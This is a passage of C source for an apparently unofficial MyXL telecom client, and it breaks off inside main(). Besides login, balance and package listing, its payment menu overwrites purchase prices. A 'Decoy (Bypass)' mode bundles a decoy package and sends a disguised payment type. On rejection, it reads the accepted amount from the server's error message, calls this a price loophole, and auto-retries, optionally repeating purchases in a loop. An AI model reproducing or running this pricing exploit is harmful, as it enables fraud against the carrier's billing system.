#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include "../include/cJSON.h"
#include "../include/util/env_loader.h"
#include "../include/client/ciam.h"
#include "../include/client/engsel.h"

int active_account_idx = 0;
double active_number = 0;
char active_subs_type[32] = "UNKNOWN";
char id_tok[4096] = {0};
char acc_tok[4096] = {0};
int is_logged_in = 0;

double cached_balance = 0;
char cached_exp[32] = "--";

struct ActivePackage {
    char name[128];
    char quota_code[128];
    char prod_subs_type[64];
    char prod_domain[64];
    char family_code[128];
};

void clear_screen() { printf("\033[H\033[J"); fflush(stdout); }
void flush_stdin() { int c; while ((c = getchar()) != '\n' && c != EOF); }

void clean_input_string(char *str) {
    if (!str) return;
    char *p = str; char *q = str;
    while (*p) {
        if (*p >= 32 && *p <= 126) { *q++ = *p; }
        p++;
    }
    *q = '\0';
    char *start = str;
    while (*start == ' ') start++;
    if (start != str) memmove(str, start, strlen(start) + 1);
    int len = strlen(str);
    while (len > 0 && str[len - 1] == ' ') { str[len - 1] = '\0'; len--; }
}

void sanitize_json_string(char *str) {
    if (!str) return;
    char *p = str; char *q = str;
    while (*p) {
        if ((unsigned char)*p == 0xC2 && (unsigned char)*(p+1) == 0xA0) {
            *q++ = ' '; p += 2;
        } else if ((unsigned char)*p == 0xE2 && (unsigned char)*(p+1) == 0x80 && ((unsigned char)*(p+2) == 0x8B || (unsigned char)*(p+2) == 0x8C || (unsigned char)*(p+2) == 0x8E)) {
            p += 3;
        } else {
            *q++ = *p++;
        }
    }
    *q = '\0';
}

void clean_html_tags(char *dest, const char *src) {
    int i = 0, j = 0, in_tag = 0;
    while (src[i] != '\0') {
        if (src[i] == '<') {
            in_tag = 1;
            if (strncasecmp(&src[i], "<br", 3) == 0) dest[j++] = '\n';
            else if (strncasecmp(&src[i], "<li", 3) == 0) { dest[j++] = '\n'; dest[j++] = '-'; dest[j++] = ' '; }
        } else if (src[i] == '>') { in_tag = 0; } 
        else if (!in_tag) { dest[j++] = src[i]; }
        i++;
    }
    dest[j] = '\0';
}

void save_tokens(cJSON *tokens_arr) {
    FILE *f = fopen("/etc/engsel/refresh-tokens.json", "w");
    if (f) { char *json_str = cJSON_Print(tokens_arr); fprintf(f, "%s\n", json_str); free(json_str); fclose(f); }
}

void save_active_number() {
    FILE *f = fopen("/etc/engsel/active.number", "w");
    if (f) { fprintf(f, "%.0f\n", active_number); fclose(f); }
}

void load_active_number(cJSON *tokens_arr) {
    FILE *f = fopen("/etc/engsel/active.number", "r");
    if (f) {
        char buf[32];
        if (fgets(buf, sizeof(buf), f)) {
            double num = atof(buf); int count = cJSON_GetArraySize(tokens_arr);
            for (int i = 0; i < count; i++) {
                cJSON *item = cJSON_GetArrayItem(tokens_arr, i);
                cJSON *num_item = cJSON_GetObjectItem(item, "number");
                if (num_item && num_item->valuedouble == num) { active_account_idx = i; active_number = num; break; }
            }
        }
        fclose(f);
    }
}

void authenticate_and_fetch_balance(cJSON* tokens_arr, const char* B_CIAM, const char* B_API, const char* B_AUTH, const char* UA, const char* API_KEY, const char* XDATA_KEY, const char* X_API_SEC) {
    is_logged_in = 0; cached_balance = 0; strcpy(cached_exp, "--");
    if (!tokens_arr || !cJSON_IsArray(tokens_arr) || cJSON_GetArraySize(tokens_arr) == 0) return;
    if (active_account_idx >= cJSON_GetArraySize(tokens_arr)) active_account_idx = 0;
    
    cJSON *account = cJSON_GetArrayItem(tokens_arr, active_account_idx);
    cJSON *rt_item = cJSON_GetObjectItem(account, "refresh_token");
    cJSON *num_item = cJSON_GetObjectItem(account, "number");
    cJSON *sub_item = cJSON_GetObjectItem(account, "subscription_type");
    
    if (num_item) active_number = num_item->valuedouble;
    if (sub_item) strncpy(active_subs_type, sub_item->valuestring, sizeof(active_subs_type) - 1);
    save_active_number(); 

    if (rt_item && rt_item->valuestring) {
        printf("\n[*] Autentikasi akun %.0f...\n", active_number);
        cJSON* auth_response = get_new_token(B_CIAM, B_AUTH, UA, rt_item->valuestring);
        if (auth_response) {
            cJSON* id = cJSON_GetObjectItem(auth_response, "id_token"); 
            cJSON* acc = cJSON_GetObjectItem(auth_response, "access_token");
            cJSON* new_rt = cJSON_GetObjectItem(auth_response, "refresh_token");
            
            if (id && acc) {
                if(id && cJSON_IsString(id)) { strncpy(id_tok, id->valuestring, sizeof(id_tok)-1); id_tok[sizeof(id_tok)-1]='\0'; } if(acc && cJSON_IsString(acc)) { strncpy(acc_tok, acc->valuestring, sizeof(acc_tok)-1); acc_tok[sizeof(acc_tok)-1]='\0'; } is_logged_in = 1;
                
                if (new_rt && cJSON_IsString(new_rt)) { cJSON_ReplaceItemInObject(account, "refresh_token", cJSON_CreateString(new_rt->valuestring)); }
                
                cJSON* prof_res = get_profile(B_API, API_KEY, XDATA_KEY, X_API_SEC, id_tok, acc_tok);
                if (prof_res) {
                    cJSON* p_data = cJSON_GetObjectItem(prof_res, "data");
                    if (p_data) {
                        cJSON* profile = cJSON_GetObjectItem(p_data, "profile");
                        if (profile) {
                            cJSON* st = cJSON_GetObjectItem(profile, "subscription_type");
                            if (st && cJSON_IsString(st)) {
                                strncpy(active_subs_type, st->valuestring, sizeof(active_subs_type) - 1);
                                cJSON* old_sub = cJSON_GetObjectItem(account, "subscription_type");
                                if (old_sub) cJSON_ReplaceItemInObject(account, "subscription_type", cJSON_CreateString(active_subs_type));
                                else cJSON_AddStringToObject(account, "subscription_type", active_subs_type);
                            }
                        }
                    }
                    cJSON_Delete(prof_res);
                }
                save_tokens(tokens_arr); 
                
                cJSON* bal_res = get_balance(B_API, API_KEY, XDATA_KEY, X_API_SEC, id_tok);
                if (bal_res) {
                    cJSON* data = cJSON_GetObjectItem(bal_res, "data");
                    if (data) {
                        cJSON* balance = cJSON_GetObjectItem(data, "balance"); cJSON* expired_at = cJSON_GetObjectItem(data, "expired_at");
                        if (balance) {
                            if (cJSON_IsObject(balance)) {
                                cJSON* rem = cJSON_GetObjectItem(balance, "remaining"); if (rem) cached_balance = rem->valuedouble;
                                cJSON* exp = cJSON_GetObjectItem(balance, "expired_at");
                                if (exp && exp->valuedouble > 0) { time_t ext = (exp->valuedouble > 9999999999LL) ? (time_t)(exp->valuedouble / 1000) : (time_t)exp->valuedouble; struct tm *ti = localtime(&ext); strftime(cached_exp, sizeof(cached_exp), "%Y-%m-%d", ti); }
                            } else {
                                cached_balance = balance->valuedouble;
                                if (expired_at && expired_at->valuedouble > 0) { time_t ext = (expired_at->valuedouble > 9999999999LL) ? (time_t)(expired_at->valuedouble / 1000) : (time_t)expired_at->valuedouble; struct tm *ti = localtime(&ext); strftime(cached_exp, sizeof(cached_exp), "%Y-%m-%d", ti); }
                            }
                        }
                    }
                    cJSON_Delete(bal_res);
                }
            } else { printf("[-] Gagal autentikasi. Sesi mungkin kedaluwarsa.\n"); }
            cJSON_Delete(auth_response);
        }
    }
}

cJSON* do_family_bruteforce(const char* B_API, const char* API_KEY, const char* XDATA_KEY, const char* X_API_SEC, const char* id_tok, const char* f_code, int is_ent_override, const char* mig_override) {
    const char* migrations[] = {"NONE", "PRE_TO_PRIOH", "PRIOH_TO_PRIO", "PRIO_TO_PRIOH"};
    int enterprises[] = {0, 1};
    cJSON* fam_res = NULL;
    int mig_count = mig_override ? 1 : 4;
    int ent_count = is_ent_override != -1 ? 1 : 2;

    for (int i = 0; i < mig_count; i++) {
        for (int j = 0; j < ent_count; j++) {
            const char* c_mig = mig_override ? mig_override : migrations[i];
            int c_ent = is_ent_override != -1 ? is_ent_override : enterprises[j];
            
            printf("[-] Mencoba is_ent=%d, mig=%s...\n", c_ent, c_mig);
            fam_res = get_family(B_API, API_KEY, XDATA_KEY, X_API_SEC, id_tok, f_code, c_ent, c_mig);
            
            if (fam_res && cJSON_GetObjectItem(fam_res, "status") && strcmp(cJSON_GetObjectItem(fam_res, "status")->valuestring, "SUCCESS") == 0) {
                cJSON* data = cJSON_GetObjectItem(fam_res, "data");
                cJSON* variants = data ? cJSON_GetObjectItem(data, "package_variants") : NULL;
                if (variants && cJSON_GetArraySize(variants) > 0) { return fam_res; }
            }
            if (fam_res) { cJSON_Delete(fam_res); fam_res = NULL; }
        }
    }
    return NULL;
}

cJSON* fetch_decoy_package(const char* subs_type, const char* B_API, const char* API_KEY, const char* XDATA_KEY, const char* X_API_SEC, const char* id_tok) {
    const char* file_name;
    if (strcmp(subs_type, "PRIOHYBRID") == 0) { file_name = "/etc/engsel/decoy_data/decoy-priohybrid-balance.json"; }
    else if (strcmp(subs_type, "PRIORITAS") == 0) { file_name = "/etc/engsel/decoy_data/decoy-prio-balance.json"; }
    else { file_name = "/etc/engsel/decoy_data/decoy-prabayar-balance.json"; }

    FILE *f = fopen(file_name, "r");
    if (!f) { printf("[-] File konfigurasi %s tidak ditemukan!\n", file_name); return NULL; }
    fseek(f, 0, SEEK_END); long fsize = ftell(f); fseek(f, 0, SEEK_SET);
    char *json_data = malloc(fsize + 1); fread(json_data, 1, fsize, f); fclose(f); json_data[fsize] = 0;
    
    sanitize_json_string(json_data);
    
    cJSON* conf = cJSON_Parse(json_data); free(json_data);
    if (!conf) { printf("[-] Gagal memparsing file %s. Format JSON mungkin masih invalid.\n", file_name); return NULL; }
    
    cJSON* fc_item = cJSON_GetObjectItem(conf, "family_code"); cJSON* vc_item = cJSON_GetObjectItem(conf, "variant_code");
    cJSON* ord_item = cJSON_GetObjectItem(conf, "order"); cJSON* ent_item = cJSON_GetObjectItem(conf, "is_enterprise");
    cJSON* mig_item = cJSON_GetObjectItem(conf, "migration_type");
    if (!fc_item || !vc_item || !ord_item) { cJSON_Delete(conf); return NULL; }
    const char* f_code = fc_item->valuestring; const char* v_code = vc_item->valuestring; int target_order = ord_item->valueint;
    int is_ent_defined = (ent_item && !cJSON_IsNull(ent_item)); int is_ent = 0;
    if (is_ent_defined) { if (cJSON_IsTrue(ent_item)) is_ent = 1; else if (cJSON_IsNumber(ent_item)) is_ent = ent_item->valueint; }
    int mig_defined = (mig_item && cJSON_IsString(mig_item)); const char* mig_type = mig_defined ? mig_item->valuestring : "NONE";

    printf("[*] Memancing Decoy Package otomatis (%s)...\n", file_name);
    cJSON* fam = do_family_bruteforce(B_API, API_KEY, XDATA_KEY, X_API_SEC, id_tok, f_code, is_ent_defined ? is_ent : -1, mig_defined ? mig_type : NULL);
    cJSON_Delete(conf);
    
    if (!fam) { printf("[-] Gagal menarik data family untuk Decoy.\n"); return NULL; }

    char opt_code[256] = {0}; cJSON* data = cJSON_GetObjectItem(fam, "data");
    if (data) {
        cJSON* variants = cJSON_GetObjectItem(data, "package_variants"); cJSON* variant;
        cJSON_ArrayForEach(variant, variants) {
            cJSON* vc = cJSON_GetObjectItem(variant, "package_variant_code");
            if (vc && strcmp(vc->valuestring, v_code) == 0) {
                cJSON* options = cJSON_GetObjectItem(variant, "package_options"); cJSON* opt;
                cJSON_ArrayForEach(opt, options) {
                    cJSON* ord = cJSON_GetObjectItem(opt, "order");
                    if (ord && ord->valueint == target_order) {
                        cJSON* oc = cJSON_GetObjectItem(opt, "package_option_code");
                        if (oc) if(oc && cJSON_IsString(oc)) { strncpy(opt_code, oc->valuestring, sizeof(opt_code)-1); opt_code[sizeof(opt_code)-1]='\0'; } break;
                    }
                }
                break;
            }
        }
    }
    cJSON_Delete(fam);
    if (strlen(opt_code) > 0) return get_package_detail(B_API, API_KEY, XDATA_KEY, X_API_SEC, id_tok, opt_code);
    return NULL;
}

void print_package_details(cJSON* d_data, const char* f_code, const char* opt_code, const char* B_API, const char* API_KEY, const char* XDATA_KEY, const char* X_API_SEC, const char* id_tok) {
    cJSON* p_opt = cJSON_GetObjectItem(d_data, "package_option");
    cJSON* p_fam = cJSON_GetObjectItem(d_data, "package_family");
    if (!p_opt || !p_fam) return;

    cJSON* price_item = cJSON_GetObjectItem(p_opt, "price");
    int price = price_item ? (cJSON_IsNumber(price_item) ? price_item->valueint : atoi(price_item->valuestring)) : 0;
    cJSON* name_node = cJSON_GetObjectItem(p_opt, "name"); const char* name = (name_node && cJSON_IsString(name_node)) ? name_node->valuestring : "";
    cJSON* p_for_item = cJSON_GetObjectItem(p_fam, "payment_for");
    const char* p_for = (p_for_item && p_for_item->valuestring) ? p_for_item->valuestring : "BUY_PACKAGE";
    cJSON* validity_item = cJSON_GetObjectItem(p_opt, "validity");
    const char* validity = (validity_item && cJSON_IsString(validity_item)) ? validity_item->valuestring : "N/A";
    cJSON* point_item = cJSON_GetObjectItem(p_opt, "point");
    int point = point_item ? point_item->valueint : 0;
    cJSON* plan_type_item = cJSON_GetObjectItem(p_fam, "plan_type");
    const char* plan_type = (plan_type_item && cJSON_IsString(plan_type_item)) ? plan_type_item->valuestring : "N/A";

    printf("\n-------------------------------------------------------\n");
    printf("Nama: %s\n", name);
    printf("Harga: Rp %d\n", price);
    printf("Payment For: %s\n", p_for);
    printf("Masa Aktif: %s\n", validity);
    printf("Point: %d\n", point);
    printf("Plan Type: %s\n", plan_type);
    printf("-------------------------------------------------------\n");
    printf("Family Code: %s\n", f_code);
    printf("-------------------------------------------------------\n");
    
    cJSON* benefits = cJSON_GetObjectItem(p_opt, "benefits");
    if (benefits && cJSON_IsArray(benefits) && cJSON_GetArraySize(benefits) > 0) {
        printf("Benefits:\n");
        cJSON* benefit;
        cJSON_ArrayForEach(benefit, benefits) {
            cJSON* b_name = cJSON_GetObjectItem(benefit, "name");
            cJSON* b_id = cJSON_GetObjectItem(benefit, "item_id");
            cJSON* b_type = cJSON_GetObjectItem(benefit, "data_type");
            cJSON* b_tot = cJSON_GetObjectItem(benefit, "total");
            cJSON* b_unlim = cJSON_GetObjectItem(benefit, "is_unlimited");
            
            const char* bn = (b_name && cJSON_IsString(b_name)) ? b_name->valuestring : "Unknown";
            const char* bi = (b_id && cJSON_IsString(b_id)) ? b_id->valuestring : "-";
            const char* bt = (b_type && cJSON_IsString(b_type)) ? b_type->valuestring : "UNKNOWN";
            double tot = b_tot ? (cJSON_IsNumber(b_tot) ? b_tot->valuedouble : atof(b_tot->valuestring)) : 0;
            
            printf("-------------------------------------------------------\n");
            printf("  Name: %s\n", bn);
            printf("  Item id: %s\n", bi);
            
            if (strcmp(bt, "DATA") == 0 && tot > 0) {
                if (tot >= 1073741824.0) printf("  Total: %.2f GB (DATA)\n", tot / 1073741824.0);
                else if (tot >= 1048576.0) printf("  Total: %.2f MB (DATA)\n", tot / 1048576.0);
                else if (tot >= 1024.0) printf("  Total: %.2f KB (DATA)\n", tot / 1024.0);
                else printf("  Total: %.0f B (DATA)\n", tot);
            } else if (strcmp(bt, "VOICE") == 0 && tot > 0) { printf("  Total: %.2f menit\n", tot / 60.0);
            } else if (strcmp(bt, "TEXT") == 0 && tot > 0) { printf("  Total: %.0f SMS\n", tot);
            } else { printf("  Total: %.0f (%s)\n", tot, bt); }
            if (b_unlim && cJSON_IsTrue(b_unlim)) printf("  Unlimited: Yes\n");
        }
        printf("-------------------------------------------------------\n");
    }

    cJSON* addons = get_addons(B_API, API_KEY, XDATA_KEY, X_API_SEC, id_tok, opt_code);
    if (addons) {
        char* add_str = cJSON_Print(addons);
        printf("Addons:\n%s\n", add_str); free(add_str); cJSON_Delete(addons);
    }
    printf("-------------------------------------------------------\n");

    cJSON* tnc_item = cJSON_GetObjectItem(p_opt, "tnc");
    if (tnc_item && cJSON_IsString(tnc_item)) {
        char* clean_tnc = malloc(strlen(tnc_item->valuestring) + 1);
        clean_html_tags(clean_tnc, tnc_item->valuestring);
        printf("SnK MyXL:\n%s\n", clean_tnc); free(clean_tnc);
    }
    printf("-------------------------------------------------------\n");
}

void handle_payment_menu(const char* B_CIAM, const char* B_API, const char* B_AUTH, const char* UA, const char* API_KEY, const char* XDATA_KEY, const char* X_API_SEC, const char* ENC_FIELD_KEY, cJSON* tokens_arr, const char* opt_code, int price, const char* name, const char* conf, const char* p_for, cJSON* bm_info, int* goto_main_flag) {
    while (1) {
        printf("Pilih Metode:\n1. Beli dengan Pulsa Biasa\n2. Beli dengan Pulsa + Decoy (Bypass / Prio Pass)\n3. Pulsa N kali\n");
        if (bm_info) printf("0. Tambahkan paket ke bookmark\n");
        printf("00. Kembali ke menu sebelumnya\n99. Kembali ke menu utama\nPilihan: "); fflush(stdout);
        char pay_choice[16];
        if (fgets(pay_choice, sizeof(pay_choice), stdin) == NULL) continue;
        pay_choice[strcspn(pay_choice, "\n")] = 0; clean_input_string(pay_choice);
        
        if (strcmp(pay_choice, "00") == 0) { break; } 
        else if (strcmp(pay_choice, "99") == 0) { *goto_main_flag = 1; break; } 
        else if (strcmp(pay_choice, "0") == 0) {
            if (bm_info) {
                FILE* f = fopen("/etc/engsel/bookmark.json", "r"); cJSON* bm_arr = NULL;
                if (f) {
                    fseek(f, 0, SEEK_END); long fsize = ftell(f); fseek(f, 0, SEEK_SET);
                    if (fsize > 0) { char* jdata = malloc(fsize + 1); fread(jdata, 1, fsize, f); jdata[fsize] = 0; sanitize_json_string(jdata); bm_arr = cJSON_Parse(jdata); free(jdata); }
                    fclose(f);
                }
                if (!bm_arr || !cJSON_IsArray(bm_arr)) { if (bm_arr) cJSON_Delete(bm_arr); bm_arr = cJSON_CreateArray(); }
                cJSON* new_bm = cJSON_Duplicate(bm_info, 1);
                cJSON_AddItemToArray(bm_arr, new_bm);
                FILE* fw = fopen("/etc/engsel/bookmark.json", "w");
                if (fw) { char* out = cJSON_Print(bm_arr); fprintf(fw, "%s\n", out); free(out); fclose(fw); 
                    cJSON* oname = cJSON_GetObjectItem(bm_info, "option_name");
                    printf("[+] Paket '%s' berhasil ditambahkan ke Bookmark!\n", oname ? oname->valuestring : "Unknown"); 
                } else { printf("[-] Gagal menyimpan bookmark.\n"); }
                cJSON_Delete(bm_arr);
            } else {
                printf("[-] Fitur bookmark hanya tersedia dari menu pencarian Family Code/HOT.\n");
            }
        }
        else if (strcmp(pay_choice, "1") == 0) {
            printf("Total amount is %d.\n", price);
            printf("Enter new amount if you need to overwrite.\nPress enter to ignore & use default amount: "); fflush(stdout);
            char ow_str[32]; int final_price = price;
            if (fgets(ow_str, sizeof(ow_str), stdin) != NULL) {
                ow_str[strcspn(ow_str, "\n")] = 0; clean_input_string(ow_str);
                if (strlen(ow_str) > 0) { final_price = atoi(ow_str); }
            }
            cJSON* buy_res = execute_balance_purchase(B_API, API_KEY, XDATA_KEY, X_API_SEC, ENC_FIELD_KEY, id_tok, acc_tok, opt_code, price, name, conf, NULL, 0, NULL, NULL, p_for, final_price, 0);
            if (buy_res) { printf("\nSTATUS TRANSAKSI:\n"); char* out = cJSON_Print(buy_res); printf("%s\n", out); free(out); cJSON_Delete(buy_res); }
        } 
        else if (strcmp(pay_choice, "2") == 0) {
            cJSON* decoy = fetch_decoy_package(active_subs_type, B_API, API_KEY, XDATA_KEY, X_API_SEC, id_tok);
            if (decoy && cJSON_GetObjectItem(decoy, "data")) {
                cJSON* dec_data = cJSON_GetObjectItem(decoy, "data"); cJSON* dec_opt = cJSON_GetObjectItem(dec_data, "package_option");
                cJSON* dec_price_item = cJSON_GetObjectItem(dec_opt, "price"); int dec_price = dec_price_item ? (cJSON_IsNumber(dec_price_item) ? dec_price_item->valueint : atoi(dec_price_item->valuestring)) : 0;
                cJSON* dec_name_node = cJSON_GetObjectItem(dec_opt, "name"); const char* dec_name = (dec_name_node && cJSON_IsString(dec_name_node)) ? dec_name_node->valuestring : ""; cJSON* dec_conf_node = cJSON_GetObjectItem(dec_data, "token_confirmation"); const char* dec_conf = (dec_conf_node && cJSON_IsString(dec_conf_node)) ? dec_conf_node->valuestring : ""; cJSON* dec_code_node = cJSON_GetObjectItem(dec_opt, "package_option_code"); const char* dec_code = (dec_code_node && cJSON_IsString(dec_code_node)) ? dec_code_node->valuestring : "";
                
                int overwrite = price + dec_price;
                printf("=> Mengeksekusi Pulsa + Decoy [%s] (Total Overwrite: Rp %d)\n", dec_name, overwrite);
                cJSON* buy_res = execute_balance_purchase(B_API, API_KEY, XDATA_KEY, X_API_SEC, ENC_FIELD_KEY, id_tok, acc_tok, opt_code, price, name, conf, dec_code, dec_price, dec_name, dec_conf, "🤫", overwrite, 1);
                
                if (buy_res && cJSON_GetObjectItem(buy_res, "message")) {
                    cJSON* msg_node = cJSON_GetObjectItem(buy_res, "message"); const char* msg = (msg_node && cJSON_IsString(msg_node)) ? msg_node->valuestring : "";
                    if (strstr(msg, "Bizz-err.Amount.Total")) {
                        char* eq = strchr(msg, '='); if (eq) {
                            int valid_amount = atoi(eq + 1);
                            printf("\n[!] Server menolak. Ditemukan celah harga: Rp %d\n[*] Melakukan Auto-Retry (Bypass V2)...\n", valid_amount);
                            cJSON_Delete(buy_res);
                            buy_res = execute_balance_purchase(B_API, API_KEY, XDATA_KEY, X_API_SEC, ENC_FIELD_KEY, id_tok, acc_tok, opt_code, price, name, conf, dec_code, dec_price, dec_name, dec_conf, "SHARE_PACKAGE", valid_amount, 1);
                        }
                    }
                }
                if (buy_res) { printf("\nSTATUS TRANSAKSI:\n"); char* out = cJSON_Print(buy_res); printf("%s\n", out); free(out); cJSON_Delete(buy_res); }
            } else { printf("[-] Gagal memancing paket Decoy.\n"); }
            if (decoy) cJSON_Delete(decoy);
        } 
        else if (strcmp(pay_choice, "3") == 0) {
            char use_decoy_str[10]; printf("Use decoy package? (y/n): "); fflush(stdout); if(!fgets(use_decoy_str, sizeof(use_decoy_str), stdin)) continue;
            char n_times_str[10]; printf("Enter number of times to purchase (e.g., 3): "); fflush(stdout); if(!fgets(n_times_str, sizeof(n_times_str), stdin)) continue;
            char delay_str[10]; printf("Enter delay between purchases in seconds (e.g., 25): "); fflush(stdout); if(!fgets(delay_str, sizeof(delay_str), stdin)) continue;

            clean_input_string(n_times_str); clean_input_string(delay_str);
            int use_decoy = (use_decoy_str[0] == 'y' || use_decoy_str[0] == 'Y') ? 1 : 0;
            int n_times = atoi(n_times_str);
            int delay_sec = atoi(delay_str);

            printf("Refreshing token...\nFetching profile...\n");
            authenticate_and_fetch_balance(tokens_arr, B_CIAM, B_API, B_AUTH, UA, API_KEY, XDATA_KEY, X_API_SEC);

            int dec_price = 0; const char* dec_name = NULL; const char* dec_conf = NULL; const char* dec_code = NULL;
            cJSON* decoy = NULL;

            if (use_decoy) {
                decoy = fetch_decoy_package(active_subs_type, B_API, API_KEY, XDATA_KEY, X_API_SEC, id_tok);
                if (decoy && cJSON_GetObjectItem(decoy, "data")) {
                    cJSON* dec_data = cJSON_GetObjectItem(decoy, "data"); cJSON* dec_opt = cJSON_GetObjectItem(dec_data, "package_option");
                    cJSON* dec_price_item = cJSON_GetObjectItem(dec_opt, "price"); dec_price = dec_price_item ? (cJSON_IsNumber(dec_price_item) ? dec_price_item->valueint : atoi(dec_price_item->valuestring)) : 0;
                    cJSON* dec_name_node = cJSON_GetObjectItem(dec_opt, "name"); dec_name = (dec_name_node && cJSON_IsString(dec_name_node)) ? dec_name_node->valuestring : ""; cJSON* dec_conf_node = cJSON_GetObjectItem(dec_data, "token_confirmation"); dec_conf = (dec_conf_node && cJSON_IsString(dec_conf_node)) ? dec_conf_node->valuestring : ""; cJSON* dec_code_node = cJSON_GetObjectItem(dec_opt, "package_option_code"); dec_code = (dec_code_node && cJSON_IsString(dec_code_node)) ? dec_code_node->valuestring : "";
                } else {
                    printf("[-] Gagal memancing paket Decoy.\n");
                    if (decoy) cJSON_Delete(decoy);
                    continue;
                }
            }

            int overwrite = price + dec_price;
            printf("Pastikan sisa balance KURANG DARI Rp%d!!!\n", overwrite);
            printf("Apakah anda yakin ingin melanjutkan pembelian? (y/n): "); fflush(stdout);
            char conf_str[10];
            if (fgets(conf_str, sizeof(conf_str), stdin) != NULL) {
                if (conf_str[0] == 'y' || conf_str[0] == 'Y') {
                    for (int k = 0; k < n_times; k++) {
                        printf("\n=======================================================\nTransaksi %d dari %d\n", k+1, n_times);
                        cJSON* buy_res = NULL;
                        if (use_decoy) {
                            buy_res = execute_balance_purchase(B_API, API_KEY, XDATA_KEY, X_API_SEC, ENC_FIELD_KEY, id_tok, acc_tok, opt_code, price, name, conf, dec_code, dec_price, dec_name, dec_conf, "🤫", overwrite, 1);
                            if (buy_res && cJSON_GetObjectItem(buy_res, "message")) {
                                cJSON* msg_node = cJSON_GetObjectItem(buy_res, "message"); const char* msg = (msg_node && cJSON_IsString(msg_node)) ? msg_node->valuestring : "";
                                if (strstr(msg, "Bizz-err.Amount.Total")) {
                                    char* eq = strchr(msg, '='); if (eq) {
                                        int valid_amount = atoi(eq + 1);
                                        printf("\n[!] Server menolak. Ditemukan celah harga: Rp %d\n[*] Melakukan Auto-Retry (Bypass V2)...\n", valid_amount);
                                        cJSON_Delete(buy_res);
                                        buy_res = execute_balance_purchase(B_API, API_KEY, XDATA_KEY, X_API_SEC, ENC_FIELD_KEY, id_tok, acc_tok, opt_code, price, name, conf, dec_code, dec_price, dec_name, dec_conf, "SHARE_PACKAGE", valid_amount, 1);
                                    }
                                }
                            }
                        } else {
                            buy_res = execute_balance_purchase(B_API, API_KEY, XDATA_KEY, X_API_SEC, ENC_FIELD_KEY, id_tok, acc_tok, opt_code, price, name, conf, NULL, 0, NULL, NULL, p_for, price, 0);
                        }
                        
                        if (buy_res) {
                            printf("\nSTATUS TRANSAKSI:\n");
                            char* out = cJSON_Print(buy_res); printf("%s\n", out); free(out); cJSON_Delete(buy_res);
                        }

                        if (k < n_times - 1) {
                            printf("\nMenunggu %d detik sebelum transaksi berikutnya...\n", delay_sec);
                            sleep(delay_sec);
                        }
                    }
                }
            }
            if (decoy) cJSON_Delete(decoy);
        }
        
        if (strcmp(pay_choice, "1")==0 || strcmp(pay_choice, "2")==0 || strcmp(pay_choice, "3")==0 || strcmp(pay_choice, "0")==0) {
            printf("\nTekan Enter untuk melanjutkan..."); fflush(stdout);
            flush_stdin();
        }
    }
}

int main() {
    srandom((unsigned int)time(NULL));   // <-- PERUBAHAN: srand -> srandom
    load_env("/etc/engsel/.env");
    const char* B_CIAM = getenv("BASE_CIAM_URL"); const char* B_API = getenv("BASE_API_URL");
    const char* B_AUTH = getenv("BASIC_AUTH"); const char* UA = getenv("UA");
    const char* API_KEY = getenv("API_KEY"); const char* XDATA_KEY = getenv("XDATA_KEY");
    const char* X_API_SEC = getenv("X_API_BASE_SECRET"); const char* ENC_FIELD_KEY = getenv("ENCRYPTED_FIELD_KEY");
    const char* AX_KEY = getenv("AX_API_SIG_KEY");

    if (!B_CIAM || !B_API || !API_KEY || !XDATA_KEY || !X_API_SEC || !ENC_FIELD_KEY) { printf("[-] Kredensial tidak lengkap di .env!\n"); return 1; }

    cJSON *tokens_arr = cJSON_CreateArray();
    FILE *fp = fopen("/etc/engsel/refresh-tokens.json", "r");
    if (fp) {
        fseek(fp, 0, SEEK_END); long fsize = ftell(fp); fseek(fp, 0, SEEK_SET);
        if (fsize > 0) {
            char *json_data = malloc(fsize + 1); fread(json_data, 1, fsize, fp); json_data[fsize] = 0;
            sanitize_json_string(json_data);
            cJSON* parsed = cJSON_Parse(json_data); free(json_data);
            if (parsed) { cJSON_Delete(tokens_arr); tokens_arr = parsed; }
        }
        fclose(fp);
    }

    load_active_number(tokens_arr);
    authenticate_and_fetch_balance(tokens_arr, B_CIAM, B_API, B_AUTH, UA, API_KEY, XDATA_KEY, X_API_SEC);

    char choice[16];
    while (1) {
        clear_screen();
        printf("=======================================================\n");
        if (is_logged_in) {
            printf("        Nomor: %.0f | Type: %s\n", active_number, active_subs_type);
            printf("         Pulsa: Rp %.0f | Aktif sampai: %s\n", cached_balance, cached_exp);
            printf("                Points: N/A | Tier: N/A\n");
        } else {
            printf("        Nomor: BELUM LOGIN | Type: N/A\n");
            printf("         Pulsa: Rp 0 | Aktif sampai: --\n");
            printf("                Points: N/A | Tier: N/A\n");
        }
        printf("=======================================================\n");
        printf("Menu:\n");
        printf("1. Login/Ganti akun\n");
        printf("2. Lihat Paket Saya\n");
        printf("3. Beli Paket HOT 🔥\n");
        printf("4. Beli Paket Berdasarkan Family Code\n");
        printf("5. Beli Semua Paket di Family Code (loop)\n");
        printf("00. Bookmark Paket\n");
        printf("99. Tutup aplikasi\n");
        printf("-------------------------------------------------------\n");
        printf("Choice: "); fflush(stdout);
        
        if (fgets(choice, sizeof(choice), stdin) == NULL) break; choice[strcspn(choice, "\n")] = 0; clean_input_string(choice);

        if (strcmp(choice, "1") == 0) {
            while (1) {
                clear_screen();
                printf("-------------------------------------------------------\nAkun Tersimpan:\n");
                int i = 0; cJSON *item;
                cJSON_ArrayForEach(item, tokens_arr) {
                    cJSON *num = cJSON_GetObjectItem(item, "number");
                    cJSON *sub = cJSON_GetObjectItem(item, "subscription_type");
                    printf("%d. %.0f  [ %-10s ] %s\n", i+1, num->valuedouble, sub ? sub->valuestring : "UNKNOWN", (i == active_account_idx) ? "✅" : "");
                    i++;
                }
                printf("-------------------------------------------------------\n");
                printf("Command:\n0: Tambah Akun (OTP)\nMasukan nomor urut akun untuk berganti.\nMasukan del <nomor urut> untuk menghapus akun tertentu.\n00: Kembali ke menu utama\nChoice: "); fflush(stdout);
                
                char cmd[64];
                if (fgets(cmd, sizeof(cmd), stdin) != NULL) {
                    cmd[strcspn(cmd, "\n")] = 0; clean_input_string(cmd);
                    if (strcmp(cmd, "00") == 0 || strcmp(cmd, "99") == 0) break;
                    else if (strcmp(cmd, "0") == 0) {
                        clear_screen();
                        printf("-------------------------------------------------------\n");
                        printf("              Login ke MyXL\n");
                        printf("-------------------------------------------------------\n");
                        printf("Masukan nomor XL (Contoh: 6281234567890)\n");
                        printf("99. Batal\n");
                        printf("-------------------------------------------------------\n");
                        printf("Nomor: "); fflush(stdout);

                        char new_num[32];
                        if (fgets(new_num, sizeof(new_num), stdin) != NULL) {
